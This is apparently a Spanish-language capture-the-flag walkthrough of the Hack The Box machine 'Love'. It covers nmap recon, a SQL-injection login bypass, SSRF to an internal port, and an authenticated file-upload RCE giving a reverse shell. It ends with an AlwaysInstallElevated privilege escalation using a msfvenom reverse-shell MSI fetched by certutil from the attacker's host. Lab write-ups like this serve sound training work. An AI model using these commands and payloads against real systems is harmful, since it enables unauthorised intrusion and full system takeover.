## Summary

Tags: #Windows #HTTP #HTTPS #SSRF #RCE #ReverShell #WinPEAS #Msfvenom #Nmap 
N
- IP -> 10.10.10.239
- Ports -> TCP (80,135,139,443,445,3306,5000,5040,5985,7680,47001,), UDP (idk)
- OS ->  Windows 
- Services & Applications
    - 80 -> Apache httpd 2.4.46 
    - 443 -> HTTPS


## Launchpad

-   **Launchpad**: [https://launchpad.net/ubuntu](https://launchpad.net/ubuntu)

## Recon

```bash
❯ whatweb ❮http://IP❯                  # Nos dara una breve descripcion del gestor de contenidos del puerto 80

	# Mirar la jQuery
	# Servidor Web
```

* Podemos ver si se inyectan comandos SQL en la pagina web
```bash
❯ Ctrl + u                             # Para ver el codigo fuente
```

Cuando una Web es muy simple, podemos usar el siguiente comando 
```bash
❯ nmap --script http-enum -p80 ❮Target IP❯ -oN WebScan #  http-enum = Aplica Fuzing a HTTP, utiliza un diccionario de 1000 rutas y ver si hay algunas rutas existen

	#  -p80 = Indica el puerto que se quiere escanear
	#  Target IP = Dirección IP que se quiere escanear
	#  -oN WebScan = Exporta el output a un fichero en formato nmap con nombre “WebScan”
```

Por lo que encontramos un posible **Admin** folder y lo colocamos en la url y efectivamente, nos coloca otra ventana de inicio de sesion pero en este caso nos pone usuario y passwd. 

```bash
❯ searchsploit  voting system                 # Para buscar un exploit
```
Para ver si hay vulnerabilidades con ese nombre. Encontramos uno que dice **Autentication Bypass 1.0 (SQLI)** y es un archivo .txt, los que dicen online creemos que no aplican 

```bash
❯ searchsploit -x 49843.txt              # Para ver el contenido del exploit 

	# x = examin
```
Para ver el contenido del archivo (x=examing)

Al ver contenido del exploit nos damos cuenta que debemos de tramitar un peticion por **POST** y debemos de meter en el login una inyeccion SQL. Por lo que nos disponemos a abrir BurpSuite y copiamos todo el login que se encuentra en el archivo .txt qye habiamos visto

Despues de colocar la inyeccion y darle Forward nos loggea automaticamente. 
Podemos enviar la data que encontramos en el Searchsploit con el boton de ‘Forward’ y luego desactivamos el ‘intercept a off’


**** 

Otra forma de hacerlo es por medio del puerto **443 ssl/http** en donde observamos que existe un subdominio el cual podemos utilizar para saber si hay algo que nos pueda ayudar. Pero antes debemos de agregar el **dominio y subdominio** a la ruta **/etc/hosts** ya que existe un virtual hosting.

```bash
❯ openssl s_client -connect ❮IP❯:443     # Para conectarnos al openssl e inspeccionar el certificado del puerto 443
```
* staging.love.htb y love.htb -> El dominio que debemos de agregar

Una vez agregado el subdominio podemos mirarlo en la pagina web 
Tiene una pestana de **demo** en donde hay una opcion que nos indica que ‘**especifiquemos una url**’

```bash
❯ python3 -m http.server 80              # Nos montamos un servidor http 80
```

```bash
❯ nvim test                              # Nos creamos un archivo llamado test en el cual le agregamos cualquier informacion
En la pagina web colocamos la url de nuestro servidor y buscamos ese archivo http://10.10.14.2/test y nos damos cuenta que nos muestra el contenido de nuestro archivo
```

Cuando la pagina web nos muestra informacion en la misma web podemos creer que es un SSRF
Por lo que nos podemos aprovechar de eso y hacer un **Server Side Request Forgery (SSRF)** 

Primero hacemos que escanee la url del puerto 80 **\http://127.0.0.1** o sea, escaneara el propio localhost de la maquina victima

Haremos que el mismo servidor se haga un internal port discovery desde el **local-host (\http://localhost:5000/ o \http://127.0.0.1:5000)** por el puerto 5000 ya que ese puerto es open, esto significa que el mismo servidor nos podria dar informacion por un puerto especifico haciendo la peticion internamente.

Ahi encontraremos el usuario admin y su passwd 

****

Buscaremos en searchsploit pero ahora el exploit en donde dice que ya estamos autenticados que se llama **File Upload RCE (Autenthicated Remote Code Execution)**

```bash
❯ searchsploit ❮exploit_name❯                 # Para buscar un exploit
```

```bash
❯ searchsploit -m ❮exploit_name❯              # Para descargarnos el exploit .py/.txt 

	# m = move
```
Puedes descargarte el archivo sploit ejecutable a tu computadora para despues poder ejecutarlo (m=move). Podemos observar que es el tipico sploit en el cual debes de meter IP, usuario, contrasena, IP de la revershell, Puerto de la revershell, para poder hacer esa autenticacion y poder ser ususario root.

```bash
❯ nvim 49445.txt                              # Para ver el contenido del exploit y modificarlo, para poder usarlo 
```

Debemos de hacer algunas modificaciones al script como:
* love.htb -> Colocarle la IP de la pagina victima
* admin -> usuario
* loveisintheair!!! -> passwd
* 10.10.14.2 -> Nuestra IP
* 443 -> Puerto de Netcat

Debemos quitarle todos los /**votesystem/** ya que eso no existe en nuestra ruta en el servidor victima.
```python
❯ python3 49445.py                            # Para ejecutar el exploit
```

Una vez corregido ejecutamos el script y nos pondemos en escucha en el puerto 443
```bash
❯ rlwrap nc -nlvp 443
```

## User

Una vez adentro nos vamos a:
```bash
❯ cd C:\Users                    # Nos cambiamos de directorio
❯ dir                            # Para ver el contenido del directorio
❯ cd Phoebe                      # Nos movemos al dir del usuario phoebe
❯ cd Desktop                     # En el desktop podemos encontrar la primer flag, user.txt
```

Ahora debemos de escalar privilegios para poder ser usuario root.
```bash
❯ cd Windows/temp                # Empezamos llendonos a ese directorio para crear una carpeta, ya que ese dir tiene privilegios de lectura y escritura
❯ mkdir Privesc                  # Creamos el directorio para escalar privilegios.
```

```bash
❯ systeminfo                     # Podemos observar la informacion del sistema Windows
```

* **Herramienta WinPEAS**: [WinPEAS](https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASexe/README.md) 
Nos dirigimos a: Download the **latest obfuscated and not obfuscated versions from here**, -> Despues debemos de descargar el archivo **winPeasx64.exe**

Podemos usar la herramienta **Winpeas** en el sistema Windows. Nos dirigimos en Google a la pagina oficial en Github de Carlospolop y descargamos de ahi el archivo ejecutable de 64 bits. Lo encontramos en realises como **winPeasx64.exe**

Lo traemos a nuestra ruta de trabajo y nos creamos un servidor para poder subirlo a la maquina victima
```bash
❯ python3 -m http.server 80              # Nos montamos un servidor http 80
```

Despues en la maquina victima Windows le decimos que queremos cargar un archivo.
```
❯ certutil.exe -f -urlcache -split \http://10.10.14.2/winPeas.exe winPeas.exe
```
Subiremos el archivo con el nombre de winPeas.exe y lo depositaremos como winPeas.exe en el equipo victima, esto se lograra con una peticion GET a nuestro servidor.

**WinPeas** sirve para detectar vias potenciales para poder escalar privilegios.
```bash
❯ winPeas.exe                            # Para ejecutar el archivo .exe en Windows
```

Podemos observar que de toda la informacion nos despliega el ‘**Checking AlwaysInstallElevated**’ y tiene:
* **set 1 in HKLM** 
* **set 1 in HKCU** lo cual es malo para esa maquina Windows.

* [Hacktricks](https://book.hacktricks.xyz/welcome/readme) nos ayudara a escalar privilegios

Vamos a la url que nos ofrece esa vulnerabilidad, 
Filtrmos por **AlwaysInstallElevated**
Nos indica que debemos utilizar el siguiente comando en nuestra maquina de atacante para poder crear un archivo que despues subiremos a la maquina Windows

```bash
❯ msfvenom -p windows/x64/shell_reverse_tcp --platform windows -a x64 LHOST=10.10.14.2 LPORT=443 -f msi -o reverse.msi 

	# p = Payload
	# f = Formato
	# o = Exportar como 
	# LHOST = Local Host (IP Atacante)
	# LPORT = Local Port Atacante
	# platform = Plataforma a usar
	# a = Arquitectura
```


## Root

Una vez creado el archivo **.msi** lo subimos a la maquina victima creando un servidor con python como lo hicimos anteriormente.
```bash
❯ python3 -m http.server 80              # Nos montamos un servidor http 80
```

Despues en la maquina victima le decimos que queremos cargar ese archivo.
```bash
❯ certutil.exe -f -urlcache -split http://10.10.14.2/reverse.msi reverse.msi

	# Ip = Maquina de atacante
```
Buscamos el archivo con ese nombre **reverse.msi** y lo depositarremos como reverse.msi en el equipo victima Windows.

```bash
❯ rlwrap nc -nlvp 443
```

Para instalar el archivo .msi en una maquina Windows debemos de colocar el siguiente comando:
```bash
❯ msiexec /quiet /qn /i reverse.msi
```
Una vez que ejecutemos el archivo en la maquina victima Windows, esta nos dara una revershell y en este caso seremos usuario **Authority\System** que seria el root.
Ahora nos vamos al Desktop del Administrator y buscamos la flag root.txt